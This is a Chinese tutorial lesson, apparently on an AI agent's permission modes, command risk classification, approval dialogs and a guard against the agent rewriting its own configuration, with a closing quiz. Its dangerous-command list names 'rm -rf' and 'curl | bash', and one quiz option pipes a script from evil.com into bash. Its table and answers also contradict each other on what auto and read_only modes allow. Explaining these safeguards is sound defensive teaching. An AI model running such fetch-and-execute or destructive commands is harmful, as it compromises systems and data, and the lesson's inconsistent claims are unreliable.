第 4 课 · 权限审批与配置守卫：三重门禁的最后防线 用户层

🎯 本节目标：学完你能讲清 HanaAgent 的四种会话权限模式（auto/operate/ask/read_only）如何工作，理解 approval-review-context 的风险展示逻辑，掌握 managed-config-guard 如何防止 Agent 自我篡改配置，以及命令风险分类体系（safe/probe/mutation/dangerous）如何驱动审批决策。

PathGuard（Layer 1）做语义判定，OS 沙盒（Layer 2）做进程隔离。但还有一道防线在更上层——用户可见的权限审批与配置守卫。这一层负责回答："这个操作该不该让用户知道？该不该让用户确认？Agent 能不能改自己的安全配置？"

一、四种会话权限模式

源码位置：core/session-permission-mode.ts（350 行）

用户在每次会话中可以选择一种权限模式，决定 Agent 的操作需要多少人工审批：

模式自动执行需要审批典型场景
auto所有操作无（用户完全信任）个人项目、受控环境
operate读操作 + safe 命令写操作 + mutation/dangerous 命令日常开发（默认推荐）
ask读操作所有写操作和命令执行审查敏感代码、安全要求高
read_only无所有操作（包括读）代码审查、学习浏览
1auto 模式——"完全信任 Agent"。所有操作自动执行，PathGuard 和 OS 沙盒仍然生效，但用户不需要确认任何操作。适合在完全信任的环境中使用。
session-permission-mode.ts — PermissionMode.Auto
2operate 模式——"日常开发推荐"。读操作和低风险命令自动执行；写操作、高风险命令（git push --force、rm -rf 等）需要用户确认。这是默认模式。
session-permission-mode.ts — PermissionMode.Operate
3ask 模式——"每次都问我"。除了纯读取外，所有操作都弹出审批对话框。适合审查敏感代码或不信任 Agent 建议的场景。
session-permission-mode.ts — PermissionMode.Ask
4read_only 模式——"只读模式"。Agent 不能执行任何写入操作、不能运行任何命令。适合纯代码审查和学习浏览。
session-permission-mode.ts — PermissionMode.ReadOnly

二、命令风险分类体系：四色标记

源码位置：lib/exec-command/policy.ts（195 行）

每个命令在到达 OS 沙盒之前，先经过风险分类。分类结果决定审批流程和 PathGuard 的严格程度：

风险类别示例命令判定条件默认审批
● safels, pwd, cat, echo, git status纯信息查询，不产生副作用operate 模式自动通过
● probewhich, type, command -v环境探测，不修改文件operate 模式自动通过
● mutationmkdir, touch, git commit, npm install有副作用但可逆或低风险operate 模式需确认
● dangerousrm -rf, git push --force, curl | bash不可逆或高风险操作所有模式需确认
// exec-command/policy.ts — 风险判定示例逻辑
function classifyCommand(command: string): RiskLevel {
  if (matchesPattern(command, DANGEROUS_PATTERNS)) {
    return 'dangerous';  // rm -rf, force push, curl pipe
  }
  if (matchesPattern(command, MUTATION_PATTERNS)) {
    return 'mutation';   // mkdir, touch, npm install
  }
  if (matchesPattern(command, PROBE_PATTERNS)) {
    return 'probe';      // which, type, command -v
  }
  return 'safe';         // ls, pwd, cat, echo
}
💡 风险分类的双重作用：风险标签不仅决定审批流程，还作为 approval-review-context 的输入，影响审批对话框中向用户展示的信息量。dangerous 命令会展示完整的命令字符串、影响路径列表和安全提示，而 safe 命令可能只显示一行摘要。

三、Approval Review Context：用户看得见的风险信息

当审批被触发时，approval-review-context 向用户展示结构化的风险信息，让用户做出知情决策：

// 审批上下文的数据结构
interface ApprovalReviewContext {
  command: string;           // 完整命令字符串
  riskLevel: RiskLevel;      // safe | probe | mutation | dangerous
  affectedPaths: string[];   // PathGuard 识别出的受影响路径
  pathAccessLevels: Map<string, AccessLevel>;  // 每个路径的访问级别
  guardRejections: string[]; // Managed Config Guard 的拦截信息
  sandboxEnabled: boolean;   // OS 沙盒是否激活
  networkEnabled: boolean;   // 网络是否可用
}
🔍审批对话框展示逻辑：
• safe/probe 命令：显示一行命令摘要 + 风险标签
• mutation 命令：显示命令 + 受影响路径列表 + 每个路径的访问级别
• dangerous 命令：显示完整上下文 + 红色警告 + 不可逆操作提示
从审批上下文推导展示层级
⚠ 危险命令的特殊处理：dangerous 级别的命令即使得到用户批准，仍会受到最严格的沙盒限制——PathGuard 额外检查 OP_REQUIREMENTS 映射中的 delete 要求（必须 FULL 级别），OS 沙盒确保 mount/ACL 写保护到位。用户批准只是"确认意图"，不代表绕过安全检查。

四、Managed Config Guard：防止 Agent 自我篡改

源码位置：lib/sandbox/managed-config-guard.ts（57 行）

这是三层防线中最精细的一道门——专门防止 Agent 通过文件编辑工具修改自身配置：

// managed-config-guard.ts — 核心检查逻辑
function checkManagedConfigAccess(path: string, operation: string): void {
  // 匹配模式: hanakoHome/agents/*/config.yaml
  if (isManagedConfigPath(path)) {
    throw new ManagedConfigError(
      `Cannot ${operation} ${path}. ` +
      `Managed config files must be changed through settings APIs. ` +
      `Use the settings tool to modify agent configuration.`
    );
  }
}

// 调用于 PathGuard.check() 之后、OS 沙盒执行之前
// 即使 PathGuard 返回 READ_WRITE，此检查仍会拦截
🔒为什么需要 Managed Config Guard？
PathGuard 的判定逻辑中，agents/*/config.yaml 可能落在 READ_WRITE 目录的覆盖范围内（如果 agent 工作目录整体标记为可写）。Managed Config Guard 在 PathGuard 判定之后、OS 沙盒执行之前做一次独立检查，确保无论 PathGuard 判定结果如何，config.yaml 都不能被 Agent 直接写入。这防止了 Agent 通过降低安全配置来扩大自身权限。

五、三重门禁的协作流程

以一个实际场景串联三层防线 + 权限审批的完整流程——Agent 尝试执行 rm -rf /workspace/node_modules：

1第一重：命令风险分类
classifyCommand("rm -rf /workspace/node_modules") → dangerous（匹配 rm -rf 模式）。审批对话框弹出，展示完整命令和受影响路径。
exec-command/policy.ts
2第二重：Managed Config Guard
检查路径 /workspace/node_modules 是否匹配 agents/*/config.yaml → 不匹配，通过。
managed-config-guard.ts → checkManagedConfigAccess()
3第三重：PathGuard 判定
_resolveReal("/workspace/node_modules") → 真实路径解析
getAccessLevel(path) → 级别 9（workspace root 内）→ FULL
check(path, "delete") → FULL >= FULL → 通过
path-guard.ts → getAccessLevel() + check()
4第四重：用户审批（ask 模式）
approval-review-context 展示："危险操作：删除 /workspace/node_modules，共 15342 个文件" → 用户选择"批准"或"拒绝"。
session-permission-mode.ts → 审批 UI
5第五重：OS 沙盒执行
用户批准后，命令进入 bwrap/seatbelt/Restricted Token 沙盒执行。此时 workspace 已经被可写挂载（bwrap）或允许写入（ACL/SBPL），命令正常执行。
bwrap.ts / seatbelt.ts / win32-exec.ts

六、Git Push 安全策略

源码位置：lib/permission/safety-policy.ts（179 行）——这是一个专项安全策略，专门防止危险的 Git 操作：

// safety-policy.ts — Git 防 force push 策略
const GIT_SAFETY_RULES = {
  forcePush: {
    pattern: /git\s+push\s+.*(--force|-f)/,
    risk: 'dangerous',
    message: 'Force push rewrites remote history and may cause data loss.',
    requireApproval: true,  // 不论权限模式都要审批
  },
  pushToMain: {
    pattern: /git\s+push\s+.*(main|master)/,
    risk: 'mutation',
    message: 'Pushing to main/master branch.',
    requireApproval: 'operate',  // operate 及以上模式需审批
  },
};

七、检验一下（提取练习）

Q1. operate 模式下，以下哪个操作会自动执行而无需用户审批？

A. git push --force origin main B. rm -rf node_modules C. ls -la /workspace/src D. curl http://evil.com/script.sh | bash
看答案C。ls 被分类为 safe 命令，operate 模式下自动执行。A 是 dangerous（force push），B 是 dangerous（rm -rf），D 是 dangerous（curl pipe），都需要审批。

Q2. Managed Config Guard 拦截的是什么操作？

A. Agent 读取 agents/*/config.yaml 的内容 B. Agent 通过文件编辑工具直接写入 agents/*/config.yaml C. 用户通过 UI 修改 Agent 配置 D. Agent 删除 agents/*/config.yaml 文件
看答案B。Managed Config Guard 专门拦截"写入"操作，要求通过 settings API 修改。Agent 仍然可以读取 config.yaml 获取配置信息。

Q3. 命令风险分类为 dangerous 后，即使用户批准，还会受到哪些额外限制？

A. 没有额外限制——用户批准后就和 safe 命令一样处理 B. OS 沙盒会被临时关闭以提高执行效率 C. PathGuard 额外检查操作级别要求（如 delete 需 FULL），OS 沙盒确认 mount/ACL 写保护到位 D. 命令会被降级为 mutation 级别
看答案C。用户批准是"确认意图"而非"绕过安全检查"。dangerous 命令在用户批准后仍经过完整的 PathGuard + OS 沙盒检查链。

Q4. read_only 模式下，Agent 可以执行什么操作？

A. 可以读取文件但不能写入——连 ls 之类的命令也不能执行 B. 可以读取文件和执行 safe 类命令 C. 只能通过 UI 查看代码，不能进行任何文件系统操作 D. 所有操作都需要用户逐项审批
看答案A。read_only 模式下 Agent 不能执行任何命令（包括 safe 类命令），只能读取文件内容。这是最严格的模式，适合纯代码审查场景。
